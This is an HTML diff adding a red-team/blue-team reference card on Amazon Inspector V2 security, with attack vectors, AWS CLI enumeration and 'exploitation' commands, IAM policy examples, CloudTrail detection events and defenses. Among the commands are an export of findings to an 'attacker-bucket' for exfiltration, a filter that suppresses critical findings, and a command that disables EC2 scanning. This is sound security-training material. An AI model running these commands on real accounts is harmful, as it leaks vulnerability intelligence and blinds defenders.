@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Amazon Inspector V2 Security | AWS Security Cards</title>
+<meta name="description" content="Amazon Inspector V2 is an automated vulnerability management service that continuously scans EC2 instances, Lambda functions, and ECR container images for software vulnerabilities and network exposure. Attackers target scan results to identify exploitable weaknesses.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #06b6d415, #0a0e1a, #0ea5e915);
+    border: 1px solid #06b6d44d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #06b6d40d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #06b6d433;
+    color: #06b6d4;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #06b6d44d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #fb923c; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/inspector-card.webp" alt="Amazon Inspector V2 Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/inspector.svg" alt="Amazon Inspector V2 Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">Amazon Inspector V2 Security</span>
+        <span class="header-badge">VULNERABILITY SCANNING</span>
+      </div>
+      <p class="header-desc">Amazon Inspector V2 is an automated vulnerability management service that continuously scans EC2 instances, Lambda functions, and ECR container images for software vulnerabilities and network exposure. Attackers target scan results to identify exploitable weaknesses.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">MEDIUM</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">3 Types</div>
+          <div class="stat-label">EC2, Lambda, ECR</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">CVE</div>
+          <div class="stat-label">Based Scanning</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Continuous</div>
+          <div class="stat-label">Auto-Scanning</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#06b6d4;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #06b6d4;">Scan Coverage Types</h4>
+          <p>Inspector V2 provides three scanning types: EC2 instance scanning using SSM Agent, Lambda function code and layer scanning, and ECR container image scanning. All scans are automated and findings stored centrally.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Scan findings reveal exact CVEs and package versions - a roadmap for exploitation</div>
+        </div>
+        <div>
+          <h4 style="color: #06b6d4;">Finding Aggregation</h4>
+          <p>Findings include vulnerability severity scores (CVSS), affected packages, remediation guidance, and network reachability analysis. Findings can be exported to S3 or sent to EventBridge for automation.</p>
+          <div class="attack-note"><span style="color:#06b6d4;">Attack note:</span> Suppressed findings may hide critical vulnerabilities from defenders while remaining accessible</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 60%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">6.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">Inspector access provides attackers with detailed vulnerability intelligence. Scan results contain exact CVE IDs, vulnerable package versions, and network exposure data that directly enables exploitation of other resources.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Vulnerability Intelligence Theft</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> List all findings to identify exploitable CVEs</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Filter by CRITICAL severity for high-value targets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Identify unpatched EC2 instances and Lambda functions</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Map network reachability to find exposed services</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Export findings to attacker-controlled S3 bucket</li></ul><h4 style="color: #f87171;">Scan Manipulation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Suppress findings to hide vulnerabilities</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Create suppression rules to blind defenders</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Disable scanning for specific resources</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Cancel active scans during remediation</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify coverage settings to exclude targets</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Access Control Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive inspector2:* IAM policies</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Cross-account access without conditions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing resource-level restrictions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Delegated admin in untrusted accounts</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Findings exported to unencrypted S3 buckets</li></ul><h4 style="color: #fb923c;">Operational Gaps</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Suppression rules too broad (hiding real issues)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> EC2 instances missing SSM Agent for scanning</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> ECR scanning not enabled for all repositories</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Lambda function scanning not activated</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No EventBridge rules for critical findings</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Findings</div>
+          <pre><code>aws inspector2 list-findings \\
+  --filter-criteria '{&quot;severity&quot;:[{&quot;comparison&quot;:&quot;EQUALS&quot;,&quot;value&quot;:&quot;CRITICAL&quot;}]}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Coverage Statistics</div>
+          <pre><code>aws inspector2 list-coverage-statistics</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Covered Resources</div>
+          <pre><code>aws inspector2 list-coverage \\
+  --filter-criteria '{&quot;resourceType&quot;:[{&quot;comparison&quot;:&quot;EQUALS&quot;,&quot;value&quot;:&quot;AWS_EC2_INSTANCE&quot;}]}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Organization Config</div>
+          <pre><code>aws inspector2 describe-organization-configuration</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Suppression Rules</div>
+          <pre><code>aws inspector2 list-filters</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #2dd4bf33;">
+        <h3 style="color: #2dd4bf;">💀 Exploitation Techniques</h3><h4 style="color: #2dd4bf;">Finding Exfiltration</h4><ul><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Batch get findings with detailed CVE data</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Search for specific CVEs across all resources</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Identify Lambda functions with known RCE vulns</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Find EC2 instances with network exposure</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Export container image vulnerabilities</li></ul><h4 style="color: #2dd4bf;">Blind Defender Operations</h4><ul><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Create filters to suppress critical findings</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Suppress findings by CVE ID or resource</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Disable scanning for targeted resources</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Remove delegated admin to fragment visibility</li><li><span class="bullet" style="color: #2dd4bf;">&#x2022;</span> Cancel ongoing scans during incident response</li></ul><div class="note"><strong>Reconnaissance Gold:</strong> Inspector findings provide exact CVE IDs and package versions - use this data to select exploits for lateral movement.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🎯 CVE Intelligence Usage</h3><h4 style="color: #facc15;">High-Value Finding Types</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> CRITICAL: Remote code execution vulns</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> HIGH: Privilege escalation vulnerabilities</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Network reachability + CVE = immediate exploit</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Container image vulns for ECR/ECS/EKS</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Lambda layer vulnerabilities for serverless</li></ul><h4 style="color: #facc15;">Attack Planning Data</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Exact package versions for exploit matching</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Network path analysis for attack routing</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Resource tags for target prioritization</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Remediation status to find unpatched systems</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> First observed dates for zero-day hunting</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ListFindings - bulk finding enumeration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetFindingsReportStatus - report generation</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateFilter - suppression rule creation</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateFilter - modifying suppression rules</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DisableDelegatedAdminAccount - admin changes</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk ListFindings calls from new principal</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Suppression filters created for CRITICAL vulns</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Export operations to external S3 buckets</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Scanning disabled for specific resources</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Coverage changes during incident response</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Get All Critical Findings</div>
+          <pre><code>aws inspector2 list-findings \\
+  --filter-criteria '{
+    &quot;severity&quot;: [{&quot;comparison&quot;: &quot;EQUALS&quot;, &quot;value&quot;: &quot;CRITICAL&quot;}]
+  }' --max-results 100</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Find EC2 Instances with Network Exposure</div>
+          <pre><code>aws inspector2 list-findings \\
+  --filter-criteria '{
+    &quot;resourceType&quot;: [{&quot;comparison&quot;: &quot;EQUALS&quot;, &quot;value&quot;: &quot;AWS_EC2_INSTANCE&quot;}],
+    &quot;networkReachability.networkPath.destination.portRanges&quot;: [
+      {&quot;begin&quot;: 22, &quot;end&quot;: 22}
+    ]
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Export Findings to S3 (Exfil)</div>
+          <pre><code>aws inspector2 create-findings-report \\
+  --report-format CSV \\
+  --s3-destination '{
+    &quot;bucketName&quot;: &quot;attacker-bucket&quot;,
+    &quot;keyPrefix&quot;: &quot;inspector-exfil/&quot;
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Suppress Critical Findings</div>
+          <pre><code>aws inspector2 create-filter \\
+  --name &quot;hide-critical&quot; \\
+  --action SUPPRESS \\
+  --filter-criteria '{
+    &quot;severity&quot;: [{&quot;comparison&quot;: &quot;EQUALS&quot;, &quot;value&quot;: &quot;CRITICAL&quot;}]
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Find Lambda with Known CVEs</div>
+          <pre><code>aws inspector2 list-findings \\
+  --filter-criteria '{
+    &quot;resourceType&quot;: [{&quot;comparison&quot;: &quot;EQUALS&quot;, &quot;value&quot;: &quot;AWS_LAMBDA_FUNCTION&quot;}],
+    &quot;vulnerabilityId&quot;: [{&quot;comparison&quot;: &quot;PREFIX&quot;, &quot;value&quot;: &quot;CVE-2024&quot;}]
+  }'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Disable EC2 Scanning</div>
+          <pre><code>aws inspector2 disable \\
+  --resource-types EC2 \\
+  --account-ids 123456789012</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Inspector Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;inspector2:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Allows reading all vulnerability data and creating suppression rules</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Read-Only Findings</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;inspector2:ListFindings&quot;,
+      &quot;inspector2:ListCoverage&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringEquals&quot;: {
+        &quot;aws:PrincipalTag/Team&quot;: &quot;security&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Limited to viewing findings, restricted to security team members</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Suppression Creation</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [
+      &quot;inspector2:CreateFilter&quot;,
+      &quot;inspector2:UpdateFilter&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Allows hiding vulnerabilities through suppression rules</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Deny Suppression Modification</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Deny&quot;,
+    &quot;Action&quot;: [
+      &quot;inspector2:CreateFilter&quot;,
+      &quot;inspector2:UpdateFilter&quot;,
+      &quot;inspector2:DeleteFilter&quot;
+    ],
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Prevents modification of suppression rules as SCP or permission boundary</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Restrict Finding Access</h4>
+              <p>Limit inspector2:ListFindings to security team members only using IAM conditions.</p>
+              <pre><code>&quot;Condition&quot;: {
+  &quot;StringEquals&quot;: {
+    &quot;aws:PrincipalTag/Team&quot;: &quot;security&quot;
+  }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Deny Suppression Rule Changes</h4>
+              <p>Use SCPs to prevent creation or modification of suppression filters.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📊</span>
+            <div>
+              <h4>Monitor Finding Access</h4>
+              <p>Alert on ListFindings calls from non-security principals or unusual volumes.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Encrypt Findings Exports</h4>
+              <p>Use KMS encryption for any S3 export destinations.</p>
+              <pre><code>aws inspector2 create-findings-report \\
+  --s3-destination kmsKeyArn=arn:aws:kms:...</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>Enable All Scan Types</h4>
+              <p>Ensure EC2, Lambda, and ECR scanning are all enabled for complete coverage.</p>
+              <pre><code>aws inspector2 enable --resource-types EC2 LAMBDA ECR</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Audit Suppression Rules</h4>
+              <p>Regularly review suppression filters and alert on new filter creation.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>Amazon Inspector V2 Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
